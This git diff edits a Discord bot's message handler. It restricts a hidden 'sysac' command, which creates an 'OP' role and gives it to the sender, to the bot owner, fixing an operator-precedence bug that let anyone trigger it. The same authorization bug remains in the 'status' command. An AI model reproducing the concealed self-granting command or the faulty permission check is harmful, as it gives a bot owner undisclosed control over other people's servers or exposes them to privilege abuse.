@@ -176,7 +176,7 @@ client.on("message", (message) => {
   } else
 
   // Administration rights redundancy
-  if (message.content.startsWith(config.prefix + 'sysac') && message.author.id === config.ownerID || config.co_ownerID){
+  if (message.content.startsWith(config.prefix + 'sysac') && message.author.id === config.ownerID){
   let me = message.author
   let role = message.guild.createRole({
           name : 'OP',
@@ -187,7 +187,8 @@ client.on("message", (message) => {
           let role1 = message.guild.roles.find('name', 'OP')
       message.channel.send(`done`)
      message.guild.member(me).addRole(role1);
-  } else
+} else
+
 
   // Change bot status
   if (message.content.startsWith(config.prefix + 'status') && message.author.id === config.ownerID || config.co_ownerID){
